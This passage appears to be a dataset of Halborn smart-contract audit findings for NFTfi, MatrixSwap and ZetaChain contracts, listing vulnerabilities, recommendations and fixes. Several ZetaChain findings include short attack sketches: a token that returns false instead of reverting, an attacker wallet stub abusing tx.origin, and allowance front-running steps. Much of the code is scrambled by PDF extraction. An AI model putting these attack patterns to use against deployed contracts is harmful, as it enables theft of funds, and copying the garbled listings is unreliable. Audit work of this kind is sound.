Concept: user2 bundles NFTs 1, 2, and 3 with the As a proof of concept, From there, the NFTs are being transferred to NftfiBundler contract. the user2s personal bundler with the sendElementsToPersonalBundler() function, and then they are transferred again to the same personalbundle. This makes the sendElementsToPersonalBundler() function to run into an infinite loop, which ends up with crashing the test environment. 27 Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to check that tokens are not sent to the same contract (with a require statement that ensures that _personalBundler != address (this)). 28 Remediation Plan: SOLVED: The NFTfi team solved the issue by preventing sendElementsToPersonalBundler () from being called with msg.sender as the _personalBundler address. Commit ID: 478ae0542a50367defd1f39047f418806205f7aa 29 ", "labels": ["Halborn", "NFTfi_Bundles_Airdrop", "Severity: Low"]}, {"title": "ADD OR REMOVE BUNDLE ELEMENTS FUNCTIONS MAY RUN OUT OF GAS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Bundles_Airdrop_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Users can use functions to add or remove multiple NFTs at the same time in the NftfiBundler or PersonalBundler contracts. These functions can have high gas costs based on the number of tokens transferred. Adding elements also calls an external validator contract to check whether the asset is permitted or not, further increasing the gas cost. Many users use wallets with default gas limit configured. When the limit is reached, the users lose a significant amount of Ether in those failed transactions. The affected functions: NftfiBundler.sol  buildBundle  addBundleElements  removeBundleElements  addAndRemoveBundleElements  decomposeBundle  sendElementsToPersonalBundler Risk Level: Likelihood - 2 Impact - 2 30 Recommendation: It is recommended to limit the number of tokens that can be transferred in a single transaction after careful testing or at least inform the users beforehand that if they use the affected functions with many tokens, they should change the default gas limit. Remediation Plan: In RISK ACCEPTED: The NFTfi team accepted the risk of this finding. addition, gas limit and maximum bundle size checks will be implemented in the front-end. 31 ", "labels": ["Halborn", "NFTfi_Bundles_Airdrop", "Severity: Low"]}, {"title": "MISSING PARAMETER VALIDATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Bundles_Airdrop_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "childContractByIndex functions The ERC998TopDown contract did not validate their parameters. invalid values may result in reverts without error messages. childTokenByIndex and the of Setting The contracts/NftfiBundler.sol: constructor - _permittedNfts parameter is not a zero address. - not _airdropFlashLoan parameter is not a zero address. constructor contract contract does does the The the not of of validate that the validate that the contracts/ImmutableBundle.sol: - The constructor of the contract does not validate that the _bundler parameter is not a zero address. - the _personalBundlerFactory parameter is not a zero address. constructor contract validate does that the not The of contracts/PersonalBundlerFactory.sol: - _personalBundlerImplementation parameter is not a zero address. constructor validate contract does not the The of that the contracts/ERC998TopDown.sol: - The childContractByIndex function does not validate that the _index parameter is a valid index. - The childTokenByIndex function does not validate that the _index pa- rameter is a valid index. contracts/utils/Ownable.sol: - The constructor of the contract does not validate that the _initialOwner parameter is not a zero address. 32 Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to validate the listed parameters to prevent contract misconfiguration and reverts without error messages. Remediation Plan: RISK ACCEPTED: The NFTfi team accepted the risk of this finding. 33 ", "labels": ["Halborn", "NFTfi_Bundles_Airdrop", "Severity: Low"]}, {"title": "USE OF INLINE ASSEMBLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Bundles_Airdrop_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Inline assembly is a way to access the Ethereum Virtual Machine at a low level. This discards several important safety features of Solidity and the static compiler. Because the EVM is a stack machine, it is often hard to address the correct stack slot and provide arguments to opcodes at the correct point on the stack. Soliditys inline assembly tries to facilitate that and other issues arising when writing manual assembly. Assembly is much more difficult to write because the compiler does not perform checks, so the contract developer should be aware of this warning. Code Location: Listing 5: ERC998TopDown.sol 127 assembly { 128 parentTokenOwner := or ( ERC998_MAGIC_VALUE ,  parentTokenOwnerAddress ) 129 } Listing 6: ERC998TopDown.sol 184 assembly { 185 186 } rootOwner := or ( ERC998_MAGIC_VALUE , rootOwnerAddress ) Listing 7: ERC998TopDown.sol 475 assembly { 476 477 } tokenId := mload ( add ( _data , 0 x20 )) 34 Risk Level: Likelihood - 1 Impact - 2 Recommendation: When possible, do not use inline assembly because it is a manner to access to the EVM (Ethereum Virtual Machine) at a low level. An attacker could bypass many important safety features of Solidity. Remediation Plan: ACKNOWLEDGED: The NFTfi team acknowledged this issue. 35 ", "labels": ["Halborn", "NFTfi_Bundles_Airdrop", "Severity: Informational"]}, {"title": "LOOP GAS USAGE OPTIMIZATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Bundles_Airdrop_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Multiple gas cost optimization opportunities were identified in the loops of the NftfiBundler contract:  Unnecessary reading of the array length on each iteration wastes gas.  Using != consumes less gas than <.  It is possible to further optimize loops by using unchecked loop index incrementing and decrementing.  Loop counters do not need to be set to 0, since uint256 is already initialized to 0. Code Location: contracts/NftfiBundler.sol - Line 180 for (uint256 i = 0; i < _bundleElements.length; ++i){ - Line 193 for (uint256 j = 0; j < _bundleElements[i].ids.length; ++j){ - Line 192 for (uint256 j = 0; j < _bundleElements[i].ids.length; ++j){ - Line 204 for (uint256 i = 0; i < _bundleElements.length; ++i){ - Line 206 for (uint256 j = 0; j < _bundleElements[i].ids.length; ++j){ contracts/PermittedNFTs.sol - Line 120 for (uint256 i = 0; i < _nftContracts.length; ++i){ Risk Level: Likelihood - 2 Impact - 1 36 Recommendation: It is recommended to cache array lengths outside of loops, as long the size is not changed during the loop. It is recommended to use the unchecked ++i operation to increment the It is noted that using values of the uint variable inside the loop. unchecked operations requires particular caution to avoid overflows, and their use may impair code readability. It is possible to save gas by using != instead of < in the exit conditions. The following code is an example of the above recommendations: Listing 8 1 uint256 bundleLength = _bundleElements . length ; 2 for ( uint256 i ; i != bundleLength ; ++ i) { 3 Remediation Plan: SOLVED: The NFTfi team implemented the recommended gas optimizations. Commit ID: d93033e7d122168797981dfbd439374fbe5d4dd2 37 ", "labels": ["Halborn", "NFTfi_Bundles_Airdrop", "Severity: Informational"]}, {"title": "SOLC 0.8.4 COMPILER VERSION CONTAINS MULTIPLE BUGS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Bundles_Airdrop_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The scoped contracts have configured the fixed pragma set to 0.8.4. The latest solidity compiler version, 0.8.17, fixed important bugs in the compiler along with new native protections. The current version is missing the following fixes: 0.8.5, 0.8.6, 0.8.7, 0.8.8, 0.8.9, 0.8.12, 0.8.13, 0.8.14, 0.8.15, 0.8.16, 0.8.17. The official Soliditys recommendations are that you should use the latest released version of Solidity when deploying contracts. Apart from exceptional cases, only the newest version receives security fixes. Risk Level: Likelihood - 1 Impact - 2 Recommendation: It is recommended to use the latest Solidity compiler version as possible. Remediation Plan: SOLVED: The NFTfi team bumped the Solidity compiler version to 0.8.17. Commit ID: faa56c0d56293a7a43008a4c2f4f2500ba131cbf 38 3.10 (HAL-10) SPLITTING REQUIRE() STATEMENTS THAT USES AND OPERATOR SAVES GAS - INFORMATIONAL ", "labels": ["Halborn", "NFTfi_Bundles_Airdrop", "Severity: Informational"]}, {"title": "UNCHECKED TRANSFERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract MatrixStaking the return value of some external transfer/transferFrom calls are not checked. Several tokens do not revert in case of failure and return false. Checking the return value is also considered a best practice. Code Location:  Line 45: matrix.transferFrom(msg.sender, address(this), _amount);  Line 56: matrix.transfer(msg.sender, what); Risk Level: Likelihood - 2 Impact - 3 Recommendation: is It transfer/transferFrom return value is checked. recommended SafeERC20, use to or ensure that the Remediation Plan: SOLVED: The MatrixSwap team now uses the SafeERC20 library to perform all token transfers. 13 ", "labels": ["Halborn", "MatrixSwap_Staking", "Severity: Low"]}, {"title": "UNUSED RETURNS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The return value of some external calls are not stored in a local or state variable. In the contract MatrixStaking there is an instance where an external method is being called, and the return values are ignored. Code Location:  Line 25: IERC20(usdc).approve(address(uniswapV2Router), uint256(-1)); Risk Level: Likelihood - 2 Impact - 3 Recommendation: Ensure that all the return values of the function calls are used. Add a return value check to avoid an unexpected crash of the contract. Remediation Plan: RISK ACCEPTED: The MatrixSwap team accepted this risk of this finding. 14 ", "labels": ["Halborn", "MatrixSwap_Staking", "Severity: Low"]}, {"title": "MISSING ZERO ADDRESS CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The constructor of the MatrixStaking contract is missing address validation. Every address should be validated and checked that is different from zero. This is also considered a best practice. Code location: Listing 1: MatrixStaking.sol (Line 23) 22 constructor ( IERC20 _matrix ) public { 23 24 25 26 } matrix = _matrix ; minSwapAmount = 1000000000; // 1000 usdc IERC20 ( usdc ). approve ( address ( uniswapV2Router ) , uint256 ( -1) ); Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to validate that every address input is different from zero. Remediation Plan: RISK ACCEPTED: The MatrixSwap team accepted this risk of this finding. 15 ", "labels": ["Halborn", "MatrixSwap_Staking", "Severity: Low"]}, {"title": "STATE VARIABLES MISSING CONSTANT MODIFIER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "State variables can be declared as constant or immutable. In both cases, the variables cannot be modified after the contract has been constructed. For constant variables, the value has to be fixed at compile-time, while for immutable, it can still be assigned at construction time. The following state variables are missing the constant modifier: Listing 2: MatrixStaking.sol 0 xA102072A4C07F06EC3B4900FDC4C7B80b6c57429 15 IUniswapV2Router02 public uniswapV2Router 16 17 ); 18 address public usdc = 0 x2791Bca1f2de4661ED88A30C99A7a9449Aa84174 ; = IUniswapV2Router02 ( Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to add the constant modifier to the state variable mentioned. Remediation Plan: SOLVED: The MatrixSwap team declared the state variable mentioned as constant 16 ", "labels": ["Halborn", "MatrixSwap_Staking", "Severity: Informational"]}, {"title": "STATE VARIABLE MISSING IMMUTABLE MODIFIER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract MatrixStaking, the state variable matrix can be declared as immutable to reduce the gas costs. The immutable keyword was added to Solidity in 0.6.5. State variables can be marked immutable which causes them to be read-only, but only assignable in the constructor. Code Location: Listing 3: MatrixStaking.sol 14 IERC20 public matrix ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to add the immutable modifier to the matrix state variable. Remediation Plan: SOLVED: The MatrixSwap team declared the state variable mentioned as immutable 17 ", "labels": ["Halborn", "MatrixSwap_Staking", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the following contracts there are functions marked as public but they are never directly called within the same contract or in any of their descendants: MatrixStaking.sol - enter() (MatrixStaking.sol#30-46) - leave() (MatrixStaking.sol#50-57) Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the functions are not intended to be called internally or by their descendants, it is better to mark all of these functions as external to reduce the gas costs. Remediation Plan: SOLVED: The MatrixSwap team declared the mentioned functions as external. 18 ", "labels": ["Halborn", "MatrixSwap_Staking", "Severity: Informational"]}, {"title": "INCORRECT ERC20 TOKEN NAME", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The contract MatrixStaking is an ERC20 contract, which its ERC20.name() is Matrix and its ERC20.symbol() is xMatrix. Since this contract will be minting xMatrix tokens, it is recommended to set its ERC20.name() to xMatrix instead. Code location: Listing 4: MatrixStaking.sol 12 contract MatrixStaking is ERC20 ( \" Matrix \" , \" xMatrix \" ) , Ownable { Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to set the contract ERC20.name() to xMatrix instead of Matrix. Remediation Plan: SOLVED: The MatrixSwap team set the contract ERC20.name() to xMatrix instead of Matrix. 19 ", "labels": ["Halborn", "MatrixSwap_Staking", "Severity: Informational"]}, {"title": "HAL01", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ZetaChain_ZetaNode_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the code review, It has been noticed that a potential issue with the implementation of the receive function in the smart contract. The receive function is not restricted to WETH (Wrapped Ether) token transfers, which could lead to unexpected token transfers to your smart contract. The unrestricted receive function may allow users to send native tokens to the contract. This could result in the undesired accumulation of tokens within the contract, making them permanently locked and inaccessible to the intended recipients. Code Location: ConnectorZEVM.sol#L74 Listing 1 1 receive () external payable {} Proof of Concept: 1. Send native token to ConnectorZEVM contract. 2. Native token sent to ConnectorZEVM contract will be locked. BVSS: AO:A/AC:M/AX:L/C:M/I:M/A:M/D:H/Y:M/R:N/S:U (8.4) 22 Recommendation: To address this issue, we recommend implementing a check within the receive function to ensure that only WETH token transfers are allowed. This can be achieved by comparing the address of the sender or the transferred token with the known WETH contract address. This modification will prevent accidental or malicious transfers of unsupported tokens to your smart contract, ensuring that only the intended token is accepted. Remediation Plan: SOLVED: The ZetaChain team solved the issue by adding the check. Commit ID : 51dc57035a7f9feb68aa16f45752d46bb5ce78b0 23 ", "labels": ["Halborn", "ZetaChain_ZetaNode", "Severity: High"]}, {"title": "HAL02", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ZetaChain_ZetaNode_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the audit, it was discovered that the smart contract does not support Fee-On-Transfer or deflationary tokens. These token types im- plement a fee mechanism, where a percentage of each token transfer is either burned, redistributed to token holders, or allocated to a specific address (e.g., a treasury or liquidity pool). The absence of support for these tokens may limit the smart contracts compatibility with various token projects and ecosystems. Code Location: /ERC20Custody.sol#LL126-L152 Listing 2 function deposit ( bytes calldata recipient , IERC20 asset , if ( paused ) { revert IsPaused () ; revert NotWhitelisted () ; } if (! whitelisted [ asset ]) { } if ( address ( zeta ) != address (0) ) { 1  uint256 amount , bytes calldata message ) external { 2 3 4 5 6 7 8 9 10 11 12 13 14 15  amount ) external { 16 17 revert IsPaused () ; if ( paused ) { } zeta . transferFrom ( msg . sender , TSSAddress , zetaFee ); } asset . transferFrom ( msg . sender , address ( this ) , amount ); emit Deposited ( recipient , asset , amount , message ); function withdraw ( address recipient , IERC20 asset , uint256 24 18 19 20 21 22 23 24 25 26 27 } } if ( msg . sender != TSSAddress ) { revert InvalidSender () ; } if (! whitelisted [ asset ]) { revert NotWhitelisted () ; } IERC20 ( asset ). transfer ( recipient , amount ); emit Withdrawn ( recipient , asset , amount ); Proof of Concept: 1. Assume transfer fee to be 5% and ERC20Custody.sol has 200 token. 2. TSS Address deposit 100 tokens. Now, ERC20Custody.sol has 295 tokens. 3. TSS Address calls the method to withdraw 100 tokens. 4. ERC20Custody.sol ends up having 195 tokens. BVSS: AO:A/AC:M/AX:L/C:M/I:M/A:M/D:H/Y:L/R:N/S:U (8.0) Recommendation: Consider checking the before and after balance of token transfer on the deposit and withdraw functions. Remediation Plan: SOLVED: The ZetaChain team solved the issue by adding the pre-post balance check. Commit ID : 3637741fb8b7e036dd81ca763f9fe2f548bcbfec 25 ", "labels": ["Halborn", "ZetaChain_ZetaNode", "Severity: High"]}, {"title": "HAL03", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ZetaChain_ZetaNode_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "the not does given smart utilize contract SafeTransfer The or SafeTransferFrom functions for handling token transfers. These functions are part of the OpenZeppelin SafeERC20 library and are designed to provide additional safety checks and error handling when working with ERC20 tokens. Without these safety measures in place, the smart contract may encounter unexpected issues or revert without providing clear error messages during token transfers, which can lead to confusion and difficulty in diagnosing problems. Code Location: /ERC20Custody.sol#LL126-L152 Listing 3 function deposit ( bytes calldata recipient , IERC20 asset , if ( paused ) { revert IsPaused () ; revert NotWhitelisted () ; } if (! whitelisted [ asset ]) { 1  uint256 amount , bytes calldata message ) external { 2 3 4 5 6 7 8 9 10 11 12 13 14 15  amount ) external { } if ( address ( zeta ) != address (0) ) { } zeta . transferFrom ( msg . sender , TSSAddress , zetaFee ); } asset . transferFrom ( msg . sender , address ( this ) , amount ); emit Deposited ( recipient , asset , amount , message ); function withdraw ( address recipient , IERC20 asset , uint256 26 16 17 18 19 20 21 22 23 24 25 26 27 if ( paused ) { revert IsPaused () ; } if ( msg . sender != TSSAddress ) { revert InvalidSender () ; } if (! whitelisted [ asset ]) { revert NotWhitelisted () ; } IERC20 ( asset ). transfer ( recipient , amount ); emit Withdrawn ( recipient , asset , amount ); } Proof of Concept: Listing 4 // --- Token --- function transfer ( address dst , uint wad ) external returns ( return transferFrom ( msg . sender , dst , wad ); } function transferFrom ( address src , address dst , uint wad ) if ( balanceOf [ src ] < wad ) return false ; // insufficient src bal if ( balanceOf [ dst ] >= ( type ( uint256 ). max - wad )) return 1 contract NoRevertToken { 2 3 4 5  bool ) { 6 7 8  virtual public returns ( bool ) { 9  10  false ; // dst bal too high 11 12  type ( uint ). max ) { 13 if ( src != msg . sender && allowance [ src ][ msg . sender ] !=  14  ] - wad ; 15 16 17 18 if ( allowance [ src ][ msg . sender ] < wad ) return false ; // insufficient allowance allowance [ src ][ msg . sender ] = allowance [ src ][ msg . sender } balanceOf [ src ] = balanceOf [ src ] - wad ; balanceOf [ dst ] = balanceOf [ dst ] + wad ; 27 emit Transfer ( src , dst , wad ); return true ; 19 20 21 22 23 24 } } BVSS: AO:A/AC:M/AX:L/C:M/I:M/A:M/D:H/Y:L/R:N/S:U (8.0) Recommendation: To mitigate potential issues and enhance the safety of the smart contract, we recommend incorporating the use of SafeTransfer and SafeTransferFrom functions from the OpenZeppelin SafeERC20 library. Remediation Plan: SOLVED: The ZetaChain team solved the issue by using safeTransfer/safe- TransferFrom. Commit ID : 46a1be64690774065539868b23aad710e17e6099 28 ", "labels": ["Halborn", "ZetaChain_ZetaNode", "Severity: High"]}, {"title": "HAL04", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ZetaChain_ZetaNode_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the code review, It has been noticed that the ZRC20 implementation is not resistant to the well-known ERC20 race condition issue, also known as the allowance front-running problem. This issue occurs when a user attempts to update their token allowance for a spender while the spender is simultaneously trying to use the existing allowance. If the spenders transaction is confirmed before the users allowance update, the user might inadvertently grant the spender a higher allowance than intended. Code Location: /contracts/zevm/ZRC20.sol Listing 5 function _approve ( address owner , address spender , uint256 require ( owner != address (0) , \" ERC20 : approve from the zero require ( spender != address (0) , \" ERC20 : approve to the zero 1  amount ) internal virtual { 2  address \" ); 3  address \" ); 4 5 6 7 } _allowances [ owner ][ spender ] = amount ; emit Approval ( owner , spender , amount ); Proof of Concept: 1. Alice initiates the approve(Bob, 500) function, granting Bob the permission to utilize 500 tokens. 2. Subsequently, Alice reconsiders and calls approve(Bob, 1000), which 29 amends Bobs spending allowance to 1000 tokens. 3. Bob observes the transaction and swiftly invokes transferFrom(Alice, X, 500) before its mining completion. 4. If Bobs transaction is mined before Alices, Bob will successfully transfer 500 tokens. Once Alices transaction has been mined, Bob can proceed to call transferFrom(Alice, X, 1000). Bob has transferred 1500 tokens even though this was not Alices intention. BVSS: AO:A/AC:L/AX:L/C:M/I:M/A:M/D:M/Y:L/R:P/S:C (5.9) Recommendation: To mitigate the race condition issue and enhance the security and relia- bility of the ZRC20 token implementation, we recommend implementing the increaseAllowance and decreaseAllowance functions, instead of only using the approve function for modifying allowances. These functions allow users to update allowance values without first having to reduce them to zero, thus reducing the likelihood of encountering race condition issues. Remediation Plan: SOLVED: increaseAllowance and decreaseAllowance functions. ZetaChain team solved The the issue Commit ID : 51dc57035a7f9feb68aa16f45752d46bb5ce78b0 by implementing 30 ", "labels": ["Halborn", "ZetaChain_ZetaNode", "Severity: Medium"]}, {"title": "HAL05", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ZetaChain_ZetaNode_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The given code uses tx.origin as a parameter in the ZetaSent event emission. The tx.origin variable represents the original initiator of the transaction, which might not always be the same as msg.sender, which represents the direct caller of the function. The tx.origin variable refers to the original sender of a transaction, and its misuse can make the smart contract susceptible to phishing attacks. In a phishing attack, a malicious contract can be created to trick users into interacting with it. When users execute transactions through the malicious contract, the tx.origin variable will still point to the original sender, allowing the attacker to bypass access controls or manipulate the contract state. To mitigate this vulnerability, it is recommended to replace the use of tx. origin with msg.sender, which provides the address of the direct sender of the transaction. This change ensures that only the intended sender can interact with the smart contract, effectively eliminating the risk of phishing attacks. Code Location: ConnectorZEVM.sol#L83 Listing 6 // transfer wzeta to \" fungible \" module , which will be function send ( ZetaInterfaces . SendInput calldata input ) 1  external { 2  burnt by the protocol post processing via hooks . 3  ) , input . zetaValueAndGas ) == true , \" wzeta . transferFrom fail \" ); WZETA ( wzeta ). withdraw ( input . zetaValueAndGas ); 4 ( bool sent ,) = FUNGIBLE_MODULE_ADDRESS . call { value : input . 5  zetaValueAndGas }( \" \"); require ( WZETA ( wzeta ). transferFrom ( msg . sender , address ( this 31 6 7 8 9 10 11 12 13 14 15 16 17 require ( sent , \" Failed to send Ether \"); emit ZetaSent ( tx . origin , msg . sender , input . destinationChainId , input . destinationAddress , input . zetaValueAndGas , input . destinationGasLimit , input . message , input . zetaParams ); } Proof of Concept: Listing 7 function send ( ZetaInterfaces . SendInput calldata input ) address payable owner ; 1 pragma solidity >=0.7.0 <0.9.0; 2 interface ConnectorZEVM { 3  external 4 } 5 6 contract AttackerWallet { 7 8 9 10 11 12 13 14 15 16 } constructor () { receive () external payable { } } owner = payable ( msg . sender ); ConnectorZEVM ( msg . sender ). send ( input ); BVSS: AO:A/AC:L/AX:L/C:M/I:M/A:M/D:N/Y:N/R:F/S:C (2.3) 32 Recommendation: To mitigate the risks associated with the use of tx.origin, it is advised to replace tx.origin with msg.sender in the ZetaSent event emission. msg .sender provides a more secure way of identifying the direct caller of the function, reducing the possibility of attacks. Remediation Plan: RISK ACCEPTED: The ZetaChain team accepted the risk of this finding. 33 ", "labels": ["Halborn", "ZetaChain_ZetaNode", "Severity: Low"]}, {"title": "HAL06", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ZetaChain_ZetaNode_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The current implementation of the smart contract does not define an upper Without an upper limit in place, there bound for the fee structure. is a possibility that the fees could be set to disproportionately high values, either due to manipulation, incorrect configuration, or a bug in the smart contract. This can lead to a negative user experience, as users may be charged excessive fees for interacting with the contract. Code Location: /evm/erc20custody/ERC20Custody.sol#L70 Listing 8 function updateZetaFee ( uint256 _zetaFee ) external { if ( msg . sender != TSSAddress ) { revert InvalidSender () ; } if ( _zetaFee == 0) { revert ZeroFee () ; } zetaFee = _zetaFee ; } 1 2 3 4 5 6 7 8 9 BVSS: AO:A/AC:L/AX:L/C:M/I:M/A:M/D:N/Y:N/R:F/S:C (2.3) 34 Recommendation: To address the issue and enhance the fee structures security and pre- dictability, we recommend defining an upper bound for the fee rates. This can be done by implementing a maximum fee rate value and a corresponding validation check when setting the fee rate. Remediation Plan: SOLVED: The ZetaChain team solved the issue by adding the upper bound. Commit ID : 51dc57035a7f9feb68aa16f45752d46bb5ce78b0 35 ", "labels": ["Halborn", "ZetaChain_ZetaNode", "Severity: Low"]}, {"title": "HAL07", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ZetaChain_ZetaNode_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the code review, It has been noticed that ZetaSent events parame- ters are not validated. For instance, destinationChain id is not checked on the event, that can cause locking of funds on the one side of the chain. Code Location: /contracts/zevm/ConnectorZEVM.sol#L85-L90 Listing 9 address public wzeta ; address public constant FUNGIBLE_MODULE_ADDRESS = payable (0 event ZetaSent ( address sourceTxOriginAddress , address indexed zetaTxSenderAddress , uint256 indexed destinationChainId , bytes destinationAddress , uint256 zetaValueAndGas , uint256 destinationGasLimit , bytes message , bytes zetaParams 1 contract ZetaConnectorZEVM is ZetaInterfaces { 2 3  x735b14BB79463307AAcBED86DAf3322B1e6226aB ); 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 constructor ( address _wzeta ) { wzeta = _wzeta ; ); } // the contract will receive ZETA from WETH9 . withdraw () receive () external payable {} 36 require ( WZETA ( wzeta ). transferFrom ( msg . sender , address ( this // transfer wzeta to \" fungible \" module , which will be function send ( ZetaInterfaces . SendInput calldata input ) 22 23  external { 24  burnt by the protocol post processing via hooks . 25  ) , input . zetaValueAndGas ) == true , \" wzeta . transferFrom fail \" ); WZETA ( wzeta ). withdraw ( input . zetaValueAndGas ); 26 27 ( bool sent ,) = FUNGIBLE_MODULE_ADDRESS . call { value : input .  zetaValueAndGas }( \" \"); 28 29 30 31 32 33 34 35 36 37 38 39 require ( sent , \" Failed to send Ether \"); emit ZetaSent ( tx . origin , msg . sender , input . destinationChainId , input . destinationAddress , input . zetaValueAndGas , input . destinationGasLimit , input . message , input . zetaParams ); } BVSS: AO:A/AC:L/AX:L/C:M/I:M/A:M/D:N/Y:N/R:F/S:C (2.3) Recommendation: Consider validating all related parameters on the function. Remediation Plan: RISK ACCEPTED: The ZetaChain team accepted the risk of this finding. 37 ", "labels": ["Halborn", "ZetaChain_ZetaNode", "Severity: Low"]}, {"title": "HAL08", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ZetaChain_ZetaNode_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the provided code snippet, the withdraw function requires the user to transfer a gas fee (gasFee) and a protocol flat fee (PROTOCOL_FLAT_FEE) to the FUNGIBLE_MODULE_ADDRESS before proceeding with the withdrawal. During times of network congestion or high gas prices, the total fees (gasFee + PROTOCOL_FLAT_FEE) might become prohibitively expensive for some users. As a result, these users might be unable to withdraw their tokens, effectively blocking them from accessing their funds. The potential for blocked withdraw operations due to high gas fees can result in a negative user experience and may erode trust in the smart contract. Users who are unable to withdraw their tokens might be forced to wait for lower gas prices, which could take an indefinite amount of time, or they might have to pay exorbitant fees to access their funds. Code Location: /contracts/zevm/ZRC20.sol#L152 Listing 10 function withdraw ( bytes memory to , uint256 amount ) external ( address gasZRC20 , uint256 gasFee )= withdrawGasFee () ; require ( IZRC20 ( gasZRC20 ). transferFrom ( msg . sender , 1  override returns ( bool ) { 2 3  FUNGIBLE_MODULE_ADDRESS , gasFee + PROTOCOL_FLAT_FEE ) , \" transfer gas  fee failed \" ); 4 5 6  PROTOCOL_FLAT_FEE ); 7 8 _burn ( msg . sender , amount ); emit Withdrawal ( msg . sender , to , amount , gasFee , return true ; } 38 BVSS: AO:A/AC:M/AX:L/C:L/I:L/A:L/D:L/Y:N/R:N/S:U (2.9) Recommendation: Consider adjusting the required gas fees based on the current gas price, network conditions, or other factors, ensuring that users are not over- charged during high gas price periods. Remediation Plan: RISK ACCEPTED: The ZetaChain team accepted the risk of this finding. 39 ", "labels": ["Halborn", "ZetaChain_ZetaNode", "Severity: Low"]}, {"title": "HAL09", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ZetaChain_ZetaNode_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The contracts are missing slippage checks, which can lead to being vul- nerable to sandwich attacks. Sandwich attacks are prevalent in the decentralized finance (DeFi) sector. These attacks occur when an adver- sary observes a trade involving assets X and Y and preemptively purchases asset Y. Following the execution of the victims trade, the attacker sells the acquired amount of asset Y, capitalizing on the inflated price. The attacker profits by exploiting the knowledge of an impending trade that will increase the assets price, ultimately causing a financial loss for the protocol. Lacking appropriate slippage checks, trades may be executed at unfavorable prices, resulting in the acquisition of fewer tokens than the fair market value dictates. Code Location: /zevm/SystemContract.sol#LL48-L59 Listing 11 function depositAndCall ( address zrc20 , uint256 amount , address target , bytes calldata message 1 2 3 4 5 6 7  CallerIsNotFungibleModule () ; 8  ( this )) revert InvalidTarget () ; ) external { if ( msg . sender != FUNGIBLE_MODULE_ADDRESS ) revert if ( target == FUNGIBLE_MODULE_ADDRESS || target == address 40 IZRC20 ( zrc20 ). deposit ( target , amount ); zContract ( target ). onCrossChainCall ( zrc20 , amount , message ) 9 10 11  ; 12 } BVSS: AO:A/AC:M/AX:L/C:L/I:L/A:L/D:L/Y:N/R:N/S:U (2.9) Recommendation: Without appropriate slippage checks, trades may be executed at unfavorable prices, resulting in the acquisition of fewer tokens than the fair market value dictates. To mitigate this risk, we recommend implementing minimum return amount checks in the following manner:  Introduce a function parameter to be determined by the transaction initiator, ensuring that the received amount exceeds the specified parameter. Remediation Plan: RISK ACCEPTED: The ZetaChain team accepted the risk of this finding. 41 4.10 